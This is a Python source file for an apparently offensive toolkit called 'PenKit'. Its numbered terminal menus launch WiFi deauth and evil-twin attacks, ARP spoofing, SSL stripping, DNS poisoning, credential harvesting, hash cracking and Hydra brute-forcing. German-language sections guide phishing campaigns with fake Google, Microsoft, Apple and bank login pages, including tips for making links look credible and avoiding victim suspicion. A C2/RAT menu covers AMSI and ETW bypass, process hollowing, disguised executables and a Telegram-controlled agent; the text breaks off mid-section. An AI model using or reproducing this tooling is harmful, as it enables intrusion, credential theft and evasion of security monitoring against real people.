#!/usr/bin/env python3
"""
PenKit Classic Menu — terminal-native numbered interface.
No dependencies beyond Python stdlib + tool modules.
"""

import os
import sys
import asyncio
import time
import random

# ── ANSI colours ──────────────────────────────────────────────────────────────
R  = "\033[0m"          # reset
G  = "\033[92m"         # bright green
DG = "\033[32m"         # dark green
C  = "\033[96m"         # cyan
Y  = "\033[93m"         # yellow
RD = "\033[91m"         # red
W  = "\033[97m"         # white
DIM= "\033[2m"          # dim
B  = "\033[1m"          # bold
BL = "\033[5m"          # blink

def clr():
    os.system("clear" if os.name != "nt" else "cls")

def slow(text: str, delay: float = 0.018):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def banner():
    clr()
    art = f"""
{DG}  ██████╗ ███████╗███╗   ██╗██╗  ██╗██╗████████╗
{G}  ██╔══██╗██╔════╝████╗  ██║██║ ██╔╝██║╚══██╔══╝
{G}  ██████╔╝█████╗  ██╔██╗ ██║█████╔╝ ██║   ██║
{G}  ██╔═══╝ ██╔══╝  ██║╚████║██╔═██╗ ██║   ██║
{DG}  ██║     ███████╗██║ ╚███║██║  ██╗██║   ██║
{DG}  ╚═╝     ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝╚═╝   ╚═╝{R}
{DIM}             Authorized Pentesting Framework v3             {R}
{DIM}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}
"""
    print(art)

def section(title: str, subtitle: str = ""):
    w = 70
    print(f"\n{G}╔{'═'*(w-2)}╗{R}")
    print(f"{G}║{B}{title.center(w-2)}{R}{G}║{R}")
    if subtitle:
        print(f"{G}║{DIM}{subtitle.center(w-2)}{R}{G}║{R}")
    print(f"{G}╚{'═'*(w-2)}╝{R}\n")

def info_box(lines: list[str]):
    """Prints a dim info box — used to explain what a field means."""
    w = 68
    print(f"  {DIM}┌{'─'*(w-2)}┐{R}")
    for line in lines:
        padded = f"  {line}"
        print(f"  {DIM}│{R}{DIM}{padded:<{w-2}}{R}{DIM}│{R}")
    print(f"  {DIM}└{'─'*(w-2)}┘{R}")

def menu_item(num: str, label: str, danger: str = "", hint: str = ""):
    color = {"🟢": DG, "🟡": Y, "🟠": Y, "🔴": RD, "⛔": RD}.get(danger, G)
    hint_str = f"  {DIM}{hint}{R}" if hint else ""
    print(f"  {DIM}[{R}{G}{B}{num:>2}{R}{DIM}]{R}  {color}{B}{label}{R}{hint_str}  {danger}")

def prompt(text: str = "penkit") -> str:
    try:
        return input(f"\n{G}┌─[{C}{text}{G}]\n└─▶ {W}").strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return "0"

def wait_key():
    input(f"\n{DIM}  [Press Enter to continue...]{R}")

def print_output_line(line: str):
    line = line.strip()
    if not line:
        return
    if "[+]" in line or "FOUND" in line or "SUCCESS" in line or "CRACKED" in line:
        print(f"  {G}✓  {line}{R}")
    elif "[ERROR]" in line or "ERROR" in line:
        print(f"  {RD}✗  {line}{R}")
    elif "[!]" in line or "WARN" in line or "THREAT" in line:
        print(f"  {Y}!  {line}{R}")
    elif "[*]" in line:
        print(f"  {C}→  {line}{R}")
    elif "═" in line or "─" in line:
        print(f"  {DG}{line}{R}")
    else:
        print(f"  {DIM}{line}{R}")

async def run_tool_live(gen):
    """Stream async generator output to terminal."""
    try:
        async for line in gen:
            print_output_line(line)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user{R}")

# ── Tool input helpers ────────────────────────────────────────────────────────

def ask(label: str, default: str = "", required: bool = False) -> str:
    default_hint = f" [{DIM}{default}{R}]" if default else ""
    val = input(f"  {C}{label}{default_hint}: {W}").strip()
    if not val and default:
        return default
    if not val and required:
        print(f"  {RD}Required!{R}")
        return ask(label, default, required)
    return val

def ask_int(label: str, default: int) -> int:
    val = ask(label, str(default))
    try:
        return int(val)
    except ValueError:
        return default

# ═════════════════════════════════════════════════════════════════════════════
# MENUS
# ═════════════════════════════════════════════════════════════════════════════

async def menu_wifi():
    from tools.wifi import WifiScanner, HandshakeCapture, PMKIDAttack, DeauthFlood, EvilTwin
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("📡  WiFi ATTACKS")
        menu_item("1", "WiFi Scanner",          "🟡")
        menu_item("2", "Handshake Capture",     "🟠")
        menu_item("3", "PMKID Attack",          "🟠")
        menu_item("4", "Deauth Flood",          "🔴")
        menu_item("5", "Evil Twin + Portal",    "🔴")
        menu_item("0", "Back")

        choice = prompt("wifi")
        if choice == "0":
            return

        clr()
        if choice == "1":
            iface = ask("Interface", cfg.get("interface", "wlan0"))
            t = WifiScanner(iface)
            print(f"\n{G}[*] Starting... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.enable_monitor())
                await run_tool_live(t.scan())
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "2":
            iface = ask("Monitor interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid = ask("Target BSSID (AA:BB:CC:DD:EE:FF)", required=True)
            channel = ask("Channel", "6")
            t = HandshakeCapture(iface, cfg.get("output_dir", "/tmp"))
            print(f"\n{G}[*] Capturing... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.capture(bssid, channel))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "3":
            iface = ask("Interface", cfg.get("interface", "wlan0"))
            bssid = ask("Target BSSID (empty = all APs)", "")
            t = PMKIDAttack(iface, cfg.get("output_dir", "/tmp"))
            try:
                await run_tool_live(t.capture(bssid))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            iface = ask("Monitor interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid = ask("Target BSSID", required=True)
            client = ask("Client MAC", "FF:FF:FF:FF:FF:FF")
            count = ask_int("Count (0=continuous)", 0)
            t = DeauthFlood(iface)
            print(f"\n{RD}[!] Deauthing {bssid}... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.flood(bssid, client, count))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "5":
            iface = ask("Interface", "wlan0")
            ssid = ask("Target SSID to clone", required=True)
            channel = ask("Channel", "6")
            t = EvilTwin(iface, cfg.get("output_dir", "/tmp"))
            try:
                await run_tool_live(t.start(ssid, channel))
            except KeyboardInterrupt:
                await t.stop()

        wait_key()


async def menu_network():
    from tools.network import NetworkScanner
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("🌐  NETWORK INTELLIGENCE")
        menu_item("1", "Quick Host Discovery",    "🟡")
        menu_item("2", "Full Scan + Attack Chain","🟠")
        menu_item("3", "Stealth Scan",            "🟠")
        menu_item("4", "Export Last Scan (JSON)", "🟢")
        menu_item("0", "Back")

        choice = prompt("network")
        if choice == "0":
            return

        clr()
        scanner = NetworkScanner(cfg.get("output_dir", "/tmp"))

        if choice == "1":
            target = ask("Target CIDR or IP (empty = auto-detect)", "")
            try:
                await run_tool_live(scanner.discover_hosts(target))
            except KeyboardInterrupt:
                await scanner.stop()

        elif choice in ("2", "3"):
            target = ask("Target CIDR or IP (empty = auto-detect)", "")
            stealth = (choice == "3")
            print(f"\n{G}[*] Full scan running... this takes a few minutes{R}\n")
            try:
                await run_tool_live(scanner.full_scan(target, stealth=stealth))
            except KeyboardInterrupt:
                await scanner.stop()

        elif choice == "4":
            path = await scanner.export_json()
            if path:
                print(f"\n{G}[+] Exported: {path}{R}")
            else:
                print(f"\n{Y}[!] No scan data. Run a scan first.{R}")

        wait_key()


async def menu_web():
    from tools.web import WebFingerprinter, SmartFuzzer, SQLInjector, WebVulnScanner
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("💻  WEB ATTACK")
        menu_item("1", "Fingerprint Target",          "🟡")
        menu_item("2", "Directory Fuzzer (ffuf)",     "🟠")
        menu_item("3", "SQL Injection (sqlmap)",      "🟠")
        menu_item("4", "Vuln Scan (nikto + nuclei)",  "🟠")
        menu_item("5", "Full Auto Chain (all above)", "🟠")
        menu_item("0", "Back")

        choice = prompt("web")
        if choice == "0":
            return

        clr()
        if choice in ("1","2","3","4","5"):
            url = ask("Target URL (https://...)", required=True)

        if choice == "1":
            t = WebFingerprinter()
            await run_tool_live(t.fingerprint(url))

        elif choice == "2":
            ext = ask("Extensions", "php,html,txt,js")
            fs  = ask("Filter size (noise, empty=off)", "")
            t = SmartFuzzer()
            try:
                await run_tool_live(t.fuzz_dirs(url, extensions=ext, filter_size=fs))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "3":
            waf = ask("WAF type (cloudflare/modsecurity, empty=auto)", "")
            t = SQLInjector()
            try:
                await run_tool_live(t.detect(url, waf))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            t = WebVulnScanner()
            try:
                await run_tool_live(t.full_scan(url))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "5":
            print(f"\n{G}[*] Phase 1: Fingerprint{R}")
            fp = WebFingerprinter(); await run_tool_live(fp.fingerprint(url))
            print(f"\n{G}[*] Phase 2: Fuzz{R}")
            fz = SmartFuzzer()
            try:
                await run_tool_live(fz.fuzz_dirs(url))
            except KeyboardInterrupt:
                pass
            print(f"\n{G}[*] Phase 3: Vuln Scan{R}")
            sc = WebVulnScanner()
            try:
                await run_tool_live(sc.nuclei_scan(url))
            except KeyboardInterrupt:
                pass

        wait_key()


async def menu_passwords():
    from tools.passwords import HashcatCracker, JohnCracker, detect_hash
    from tools.passwords.hydra import HydraCracker
    from core.config import load
    cfg = load()
    wl = cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt")

    while True:
        banner()
        section("🔑  PASSWORDS")
        menu_item("1", "Identify Hash Type",         "🟢")
        menu_item("2", "Crack Hash — Hashcat (GPU)", "🟡")
        menu_item("3", "Crack Hash — John",          "🟡")
        menu_item("4", "Crack WPA2 .cap File",       "🟡")
        menu_item("5", "Network Brute-Force (Hydra)","🟠")
        menu_item("0", "Back")

        choice = prompt("passwords")
        if choice == "0":
            return

        clr()
        if choice == "1":
            h = ask("Hash", required=True)
            results = detect_hash(h)
            print()
            for r in results:
                print(f"  {G}→  {B}{r.hash_type}{R}  {DIM}hashcat mode: {r.hashcat_mode}  john: {r.john_format}{R}")
                print(f"     {DIM}{r.description}{R}")

        elif choice == "2":
            h = ask("Hash or file path", required=True)
            mode = ask_int("Mode (-1 = auto)", -1)
            wordlist = ask("Wordlist", wl)
            t = HashcatCracker(wordlist)
            try:
                await run_tool_live(t.crack(h, mode, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "3":
            h = ask("Hash or file path", required=True)
            fmt = ask("Format (empty = auto)", "")
            wordlist = ask("Wordlist", wl)
            t = JohnCracker(wordlist)
            try:
                await run_tool_live(t.crack(h, fmt, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            cap = ask(".cap file path", required=True)
            wordlist = ask("Wordlist", wl)
            t = HashcatCracker(wordlist)
            try:
                await run_tool_live(t.crack_cap(cap, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "5":
            target = ask("Target IP", required=True)
            proto  = ask("Protocol (ssh/ftp/rdp/smb/mysql)", "ssh")
            user   = ask("Username (empty = common defaults)", "")
            wordlist = ask("Wordlist", wl)
            port   = ask_int("Port (0 = default)", 0)
            t = HydraCracker()
            try:
                await run_tool_live(t.crack(target, proto, user, "", wordlist, port))
            except KeyboardInterrupt:
                await t.stop()

        wait_key()


async def menu_mitm():
    from tools.mitm import BettercapEngine, ResponderEngine
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("☠️   MITM — MAN IN THE MIDDLE")
        menu_item("1", "ARP Spoof",              "🔴")
        menu_item("2", "SSL Strip",              "🔴")
        menu_item("3", "DNS Poison",             "🔴")
        menu_item("4", "Credential Harvester",   "🔴")
        menu_item("5", "Responder (NTLM Hashes)","🔴")
        menu_item("0", "Back")

        choice = prompt("mitm")
        if choice == "0":
            return

        clr()
        iface = ask("Interface", cfg.get("interface", "eth0"))

        if choice == "5":
            t = ResponderEngine(iface)
            print(f"\n{G}[*] Poisoning LLMNR/NBT-NS... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.capture())
            except KeyboardInterrupt:
                await t.stop()
        else:
            target = ask("Victim IP/range (empty = entire subnet)", "")
            t = BettercapEngine(iface, cfg.get("output_dir", "/tmp"))
            try:
                if choice == "1":
                    await run_tool_live(t.arp_spoof(target))
                elif choice == "2":
                    await run_tool_live(t.ssl_strip(target))
                elif choice == "3":
                    domains  = ask("Domains to hijack", "*.google.com")
                    redirect = ask("Redirect IP (empty = auto)", "")
                    await run_tool_live(t.dns_poison(target, domains, redirect))
                elif choice == "4":
                    print(f"\n{G}[*] Live credential capture... Ctrl+C to stop{R}\n")
                    await run_tool_live(t.harvest_creds(target))
            except KeyboardInterrupt:
                await t.stop()

        wait_key()


async def menu_osint():
    from tools.osint import OSINTRecon
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("🔍  OSINT RECON")
        menu_item("1", "theHarvester (emails/subdomains/IPs)", "🟡")
        menu_item("2", "Sherlock (username across 300+ sites)", "🟡")
        menu_item("3", "Subdomain Enumeration",                "🟡")
        menu_item("4", "Google Dorks Generator",               "🟢")
        menu_item("5", "Full Recon Pipeline (all above)",      "🟡")
        menu_item("0", "Back")

        choice = prompt("osint")
        if choice == "0":
            return

        clr()
        recon = OSINTRecon(cfg.get("output_dir", "/tmp"))

        if choice == "1":
            domain = ask("Target domain (example.com)", required=True)
            await run_tool_live(recon.harvest(domain))
        elif choice == "2":
            username = ask("Username", required=True)
            await run_tool_live(recon.sherlock(username))
        elif choice == "3":
            domain = ask("Target domain", required=True)
            await run_tool_live(recon.subdomain_enum(domain))
        elif choice == "4":
            domain = ask("Target domain", required=True)
            await run_tool_live(recon.print_dorks(domain))
        elif choice == "5":
            domain = ask("Target domain", required=True)
            username = ask("Username (optional)", "")
            await run_tool_live(recon.full_recon(domain, username))

        wait_key()


async def menu_blueteam():
    from tools.blueteam import ArpWatcher, PortMonitor, AuthLogAnalyzer, Honeypot

    while True:
        banner()
        section("🔵  BLUE TEAM — DEFENSE")
        menu_item("1", "ARP Spoof Detector (live)",    "🟢")
        menu_item("2", "Auth Log — Historical Scan",   "🟢")
        menu_item("3", "Auth Log — Live Tail",         "🟢")
        menu_item("4", "Port Snapshot (baseline)",     "🟢")
        menu_item("5", "Port Diff (vs baseline)",      "🟢")
        menu_item("6", "Port Monitor (live)",          "🟢")
        menu_item("7", "Honeypot Suite",               "🟢")
        menu_item("0", "Back")

        choice = prompt("blue")
        if choice == "0":
            return

        clr()
        if choice == "1":
            iface = ask("Interface", "eth0")
            t = ArpWatcher(iface)
            print(f"\n{G}[*] Monitoring ARP traffic... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.watch())
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "2":
            log = ask("Log path (empty = auto)", "")
            t = AuthLogAnalyzer()
            await run_tool_live(t.scan_historical(log))

        elif choice == "3":
            log = ask("Log path (empty = auto)", "")
            t = AuthLogAnalyzer()
            print(f"\n{G}[*] Live monitoring... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.live_tail(log))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            t = PortMonitor()
            await run_tool_live(t.snapshot())

        elif choice == "5":
            t = PortMonitor()
            await run_tool_live(t.diff())

        elif choice == "6":
            t = PortMonitor()
            print(f"\n{G}[*] Live port monitoring... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.live_watch())
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "7":
            ssh  = ask_int("Fake SSH port",    2222)
            http = ask_int("Fake HTTP port",   8888)
            ftp  = ask_int("Fake FTP port",    2121)
            tel  = ask_int("Fake Telnet port", 2323)
            thr  = ask_int("Alert threshold",  3)
            t = Honeypot(ssh, http, ftp, tel, thr)
            print(f"\n{G}[*] Honeypot active... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.start())
            except KeyboardInterrupt:
                await t.stop()

        wait_key()


async def menu_joker():
    from tools.joker import KahootFlooder, GoogleFormsBomber, PrankPayloadGenerator
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("🃏  JOKER — PRANKS & FUN")
        menu_item("1", "Kahoot Flooder",         "🟡")
        menu_item("2", "Google Forms Bomber",    "🟡")
        menu_item("3", "Fake BSOD (Windows)",    "🟡")
        menu_item("4", "Fake Virus Scan",        "🟡")
        menu_item("5", "Fake Windows Update",    "🟡")
        menu_item("6", "Rickroll",               "🟡")
        menu_item("7", "100 Browser Tabs",       "🟡")
        menu_item("8", "Disco Terminal (Linux)", "🟢")
        menu_item("0", "Back")

        choice = prompt("joker")
        if choice == "0":
            return

        clr()
        out = cfg.get("output_dir", "/tmp")

        if choice == "1":
            pin    = ask("Kahoot PIN", required=True)
            count  = ask_int("Number of bots", 100)
            prefix = ask("Name prefix (empty = random)", "")
            t = KahootFlooder()
            try:
                await run_tool_live(t.flood(pin, count, prefix))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "2":
            url    = ask("Google Form URL", required=True)
            count  = ask_int("Submissions", 50)
            answer = ask("Custom answer (empty = random)", "")
            t = GoogleFormsBomber()
            try:
                await run_tool_live(t.bomb_google(url, count, answer))
            except KeyboardInterrupt:
                await t.stop()

        else:
            prank_map = {
                "3": "fake_bsod", "4": "fake_virus_win",
                "5": "fake_update", "6": "rickroll",
                "7": "100_tabs", "8": "disco_terminal",
            }
            prank_id = prank_map.get(choice)
            if prank_id:
                delay = ask_int("Delay before activation (sec)", 0)
                custom = ask("Tab count (only for option 7)", "100") if choice == "7" else ""
                gen = PrankPayloadGenerator()
                await run_tool_live(gen.generate(prank_id, out, delay, custom))

        wait_key()


async def menu_phishing():
    banner()
    section("🎣  PHISHING SUITE", "Fake Login Pages · Email-Kampagnen · Credential Capture")
    print(f"  {RD}{B}⛔  NUR auf autorisierten Zielen verwenden!{R}\n")

    menu_item(" 1", "🌐  Phishing-Server starten",      "⛔", "Startet Fake-Login lokal, zeigt Credentials live an")
    menu_item(" 2", "📧  Email-Kampagne senden",         "⛔", "Bulk-Phishing via SMTP mit HTML-Templates")
    menu_item(" 3", "🔗  GoPhish Integration",           "⛔", "Professionelle Kampagnen via GoPhish API")
    menu_item(" 4", "📄  Verfügbare Seiten anzeigen",    "🟡", "Google, Microsoft, Instagram, Apple, Bank")
    menu_item(" 5", "📋  Gespeicherte Credentials",      "🟡", "Zeigt alle gefangenen Passwörter aus letztem Run")
    print()
    menu_item(" 0", "← Zurück", "")
    print()

    choice = prompt("phishing")
    if choice == "0":
        return

    elif choice == "1":
        banner()
        section("🌐  PHISHING-SERVER", "Fake Login Page lokal hosten")
        info_box([
            "Startet einen HTTP-Server auf deiner Kali-Maschine.",
            "Der Link (z.B. http://192.168.1.10:8080) wird an das Opfer geschickt.",
            "Wenn das Opfer seine Daten eingibt → sofort sichtbar im Terminal + gespeichert.",
            "",
            "Tipp: Nutze einen URL-Shortener (bit.ly, t.ly) damit der Link glaubwürdiger aussieht.",
        ])
        print()
        info_box([
            "Verfügbare Seiten:",
            "  google    — Google Konto Login",
            "  microsoft — Microsoft / Office 365",
            "  instagram — Instagram",
            "  apple     — Apple ID / iCloud",
            "  bank      — Generisches Online-Banking",
        ])
        page = prompt("Seite [google/microsoft/instagram/apple/bank]  (Enter = google)") or "google"
        info_box([
            "Port = auf welchem Port der Server läuft",
            "  8080 = Standard, kein root nötig",
            "  80   = Standard HTTP (wirkt echter), braucht root",
            "  443  = HTTPS (braucht root + --https Flag)",
        ])
        try:
            port = int(prompt("Port  (Enter = 8080)") or "8080")
        except ValueError:
            port = 8080
        use_https = prompt("HTTPS? [j/n]  (Enter = n)").lower() in ("j", "y", "ja", "yes")
        info_box([
            "Redirect-URL = wohin das Opfer nach dem Login weitergeleitet wird",
            "  → Sollte die echte Seite sein damit kein Verdacht entsteht",
            "  → z.B. https://accounts.google.com  oder  https://www.instagram.com",
        ])
        redirect = prompt("Redirect-URL nach Login  (Enter = echte Seite)") or ""
        if not redirect:
            defaults = {"google": "https://accounts.google.com", "microsoft": "https://outlook.com",
                        "instagram": "https://www.instagram.com", "apple": "https://appleid.apple.com",
                        "bank": "https://www.google.com"}
            redirect = defaults.get(page, "https://google.com")

        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return
        print()
        try:
            from tools.phishing.server import PhishingServer
            srv = PhishingServer(page=page, port=port, use_https=use_https, redirect_url=redirect)
            await run_tool_live(srv.start())
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "2":
        banner()
        section("📧  EMAIL-KAMPAGNE", "Phishing-Mails per SMTP verschicken")
        info_box([
            "Verschickt personalisierte Phishing-Emails an eine Zielliste.",
            "",
            "SMTP-Presets:",
            "  gmail    — smtp.gmail.com:587  (App-Passwort nötig!)",
            "  outlook  — smtp-mail.outlook.com:587",
            "  sendgrid — smtp.sendgrid.net:587  (API-Key als Passwort)",
            "  local    — 127.0.0.1:25  (Postfix auf Kali: apt install postfix)",
            "",
            "Gmail App-Passwort: Google-Konto → Sicherheit → App-Passwörter",
        ])
        print()
        from tools.phishing.smtp_sender import SMTP_PRESETS, SMTPConfig, SMTPSender
        preset_name = prompt("Preset [gmail/outlook/sendgrid/local] oder leer für manuell")
        if preset_name in SMTP_PRESETS:
            p = SMTP_PRESETS[preset_name]
            smtp_host = p["host"]
            smtp_port = p["port"]
            use_tls   = p["use_tls"]
            print(f"  {G}[*] {p['note']}{R}")
        else:
            smtp_host = prompt("SMTP Host  (z.B. smtp.gmail.com)")
            try:
                smtp_port = int(prompt("SMTP Port  (z.B. 587)") or "587")
            except ValueError:
                smtp_port = 587
            use_tls = prompt("TLS verwenden? [j/n]").lower() in ("j", "y", "ja")

        smtp_user = prompt("SMTP Benutzername / Email")
        smtp_pass = prompt("SMTP Passwort / App-Passwort")
        from_addr = prompt(f"Absender-Adresse  (Enter = {smtp_user})") or smtp_user

        info_box([
            "Zielliste = Textdatei mit einer Email pro Zeile,",
            "  oder CSV mit Spalten 'email' und 'name' für Personalisierung.",
            "  Beispiel TXT:  /root/targets.txt",
            "  Beispiel CSV:  /root/targets.csv  (email,name)",
        ])
        targets_path = prompt("Pfad zur Zielliste (.txt oder .csv)")
        if not targets_path or not os.path.exists(targets_path):
            print(f"  {Y}[!] Datei nicht gefunden.{R}")
            wait_key()
            return

        info_box([
            "Email-Templates:",
            "  google_security  — Google Sicherheitswarnung",
            "  microsoft_mfa    — Microsoft Konto-Verifizierung",
            "  instagram_login  — Instagram Anmeldeversuch",
            "  it_department    — IT-Abteilung: Passwort läuft ab",
            "  bank_suspicious  — Bank: verdächtige Transaktion",
        ])
        template = prompt("Template  (Enter = google_security)") or "google_security"

        info_box([
            "Phishing-URL = der Link in der Email, der zur Fake-Login-Page führt.",
            "  → Dein Kali muss erreichbar sein (Port offen, IP bekannt)",
            "  → Beispiel: http://192.168.1.10:8080/?page=google",
            "  → Tipp: URL-Shortener (bit.ly) macht es glaubwürdiger",
        ])
        phish_url = prompt("Phishing-URL")
        if not phish_url:
            print(f"  {Y}[!] URL ist Pflicht.{R}")
            wait_key()
            return

        try:
            delay = float(prompt("Verzögerung zwischen Mails in Sekunden  (Enter = 2)") or "2")
        except ValueError:
            delay = 2.0

        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return

        print()
        try:
            cfg    = SMTPConfig(smtp_host, smtp_port, smtp_user, smtp_pass, use_tls)
            sender = SMTPSender(cfg)
            await run_tool_live(sender.send_campaign(targets_path, template, phish_url, from_addr, delay))
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "3":
        banner()
        section("🔗  GOPHISH INTEGRATION", "Professionelle Kampagnen-Verwaltung")
        info_box([
            "GoPhish = professionelles Open-Source Phishing-Framework.",
            "",
            "Installation auf Kali:",
            "  cd /opt && wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip",
            "  unzip gophish-*.zip && chmod +x gophish && ./gophish",
            "",
            "GoPhish gibt beim Start einen API-Key aus (z.B. 4304d5755...)",
            "Admin-UI: https://127.0.0.1:3333  (admin / gophish)",
        ])
        print()
        api_key = prompt("GoPhish API-Key")
        if not api_key:
            print(f"  {Y}[!] API-Key ist Pflicht.{R}")
            wait_key()
            return
        try:
            from tools.phishing.gophish_engine import GoPhishEngine
            engine = GoPhishEngine(api_key)
            await run_tool_live(engine.check_connection())
            print()
            print(f"  {G}[*] Für Kampagnen-Management → GoPhish Admin-UI öffnen:{R}")
            print(f"  {C}  https://127.0.0.1:3333{R}")
            print(f"  {DIM}  Username: admin  |  Passwort: gophish (beim ersten Start ändern){R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "4":
        banner()
        section("📄  VERFÜGBARE FAKE-LOGIN-SEITEN", "")
        from tools.phishing.pages import PAGES, PAGE_DESCRIPTIONS
        print()
        for name, desc in PAGE_DESCRIPTIONS.items():
            print(f"  {G}●{R}  {C}{name:<12}{R}  {W}{desc}{R}")
        print()
        print(f"  {DIM}Aufruf: http://<kali-ip>:<port>/?page=<name>{R}")
        wait_key()

    elif choice == "5":
        banner()
        section("📋  GESPEICHERTE CREDENTIALS", "")
        log = "/tmp/penkit_phish_creds.json"
        if not os.path.exists(log):
            print(f"  {Y}[!] Noch keine Credentials gefangen.{R}")
            print(f"  {DIM}Starte zuerst den Phishing-Server (Option 1){R}")
        else:
            import json as _json
            with open(log) as f:
                creds = _json.load(f)
            if not creds:
                print(f"  {Y}[*] Log-Datei leer.{R}")
            else:
                print(f"  {G}[+] {len(creds)} Credential(s) gefangen:\n{R}")
                for i, c in enumerate(creds, 1):
                    print(f"  {G}[{i}]{R}  {Y}{c['ip']:<16}{R}  {W}{c['username']:<30}{R}  {RD}{c['password']}{R}")
                    print(f"       {DIM}{c['timestamp']}  —  {c.get('page','?')}{R}")
                    print()
        wait_key()


async def menu_c2():
    banner()
    section("💀  C2 / RAT — WINDOWS PAYLOADS", "Command & Control · AV Evasion · Reverse Shell")
    print(f"  {RD}{B}⛔  NUR auf eigenen / autorisierten Geräten verwenden!{R}\n")

    menu_item(" 1", "🔨  Full Payload Package bauen",     "⛔", "Erstellt PS1 + HTA + BAT + Macro + ANLEITUNG.txt")
    menu_item(" 2", "🛡️   AMSI Bypass",                    "🔴", "Schaltet Windows Defender Scanning ab (PowerShell)")
    menu_item(" 3", "👁️   ETW Bypass",                     "🔴", "Macht Windows Event-Logging blind")
    menu_item(" 4", "🔀  AMSI + ETW kombiniert",           "🔴", "Beide Bypasses + ScriptBlock Logging in einem Befehl")
    menu_item(" 5", "💉  Process Hollowing",               "⛔", "Shellcode in svchost.exe einschleusen (RAM only)")
    menu_item(" 6", "🎭  Als PDF/Foto/Word tarnen",        "⛔", "EXE mit echtem Icon, öffnet Decoy-Datei zur Tarnung")
    menu_item(" 7", "📱  Telegram C2 Agent generieren",   "⛔", "PS1 das Befehle via Telegram empfängt + ausführt")
    menu_item(" 8", "🤖  Telegram Bot Setup",             "🔴", "Bot-Token verifizieren + Chat-ID herausfinden")
    print()
    menu_item(" 0", "← Zurück", "")
    print()

    choice = prompt("c2")
    if choice == "0":
        return

    elif choice == "1":
        banner()
        section("🔨  FULL PAYLOAD PACKAGE", "Erstellt alle Delivery-Methoden + Schritt-für-Schritt ANLEITUNG")
        info_box([
            "Was wird gebaut:",
            "  payload.ps1        — polymorphes PowerShell (AMSI+ETW bypass eingebaut)",
            "  payload_hollow.ps1 — Process Hollowing Variante (läuft in svchost)",
            "  dropper.hta        — Doppelklick-Datei → Payload startet sofort",
            "  dropper.bat        — BAT-Datei für USB / freigegebene Ordner",
            "  macro_template.vba — Word/Excel Macro (in VBA Editor einfügen)",
            "  stager_url.ps1     — Fileless: lädt Payload in RAM, NICHTS auf Disk",
            "  README_ANLEITUNG.txt — Komplette Schritt-für-Schritt Anleitung auf Deutsch",
        ])
        print()
        info_box([
            "LHOST = deine Kali IP-Adresse (wo der Listener läuft)",
            "  → Kali IP findest du mit: ip a | grep 192",
            "  → Beispiel: 192.168.1.10",
        ])
        lhost = prompt("LHOST — deine Kali IP (z.B. 192.168.1.10)")
        if not lhost:
            print(f"  {Y}[!] LHOST ist Pflicht.{R}")
            wait_key()
            return
        print()
        info_box([
            "LPORT = Port auf dem Kali lauscht (du kannst frei wählen)",
            "  → Empfohlen: 443 (sieht aus wie HTTPS, wird selten blockiert)",
            "  → Alternativ: 4444, 8443, 8080",
            "  → Dieser Port muss in der Firewall offen sein: ufw allow <PORT>",
        ])
        try:
            lport = int(prompt("LPORT — Listener-Port (default: 443)") or "443")
        except ValueError:
            lport = 443

        print(f"\n  {RD}{B}⛔  SICHERHEITSABFRAGE{R}")
        print(f"  {Y}Tippe exakt:{R}  {W}I confirm this is my authorized device{R}\n")
        confirm = prompt("Bestätigung")
        if confirm.strip().lower() != "i confirm this is my authorized device":
            print(f"\n  {Y}[!] Falsche Eingabe — abgebrochen.{R}")
            wait_key()
            return

        print()
        try:
            from tools.c2.payload_builder import PayloadBuilder, BuildConfig
            cfg = BuildConfig(lhost=lhost, lport=lport)
            builder = PayloadBuilder(cfg)
            async for line in builder.build():
                print_output_line(line)
        except Exception as e:
            print(f"  {RD}[!] Fehler: {e}{R}")
        wait_key()

    elif choice == "2":
        banner()
        section("🛡️  AMSI BYPASS", "Anti-Malware Scan Interface deaktivieren")
        info_box([
